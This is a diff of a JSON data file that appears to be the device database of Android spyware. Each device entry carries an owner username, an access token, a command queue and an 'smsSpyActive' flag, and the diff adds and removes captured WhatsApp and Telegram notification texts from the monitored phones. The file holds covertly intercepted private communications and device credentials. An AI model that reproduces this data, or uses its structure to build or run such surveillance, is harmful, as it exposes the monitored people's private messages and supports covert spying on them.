@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781601521,
+    "lastSeen": 1776781613512,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (5 pesan): ~ .",
+        "content": "sni gua pas in 900",
+        "time": "21/04 21:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781614722
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779974814
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3573 pesan dari 21 chat",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779972112
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781600183,
+    "lastSeen": 1776781612228,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:26",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781603282
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14394,14 +14402,6 @@
         "time": "21/04 20:57",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776779866575
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5951 pesan baru dari 48 obrolan",
-        "time": "21/04 20:57",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776779866519
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781600497,
+    "lastSeen": 1776781612599,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
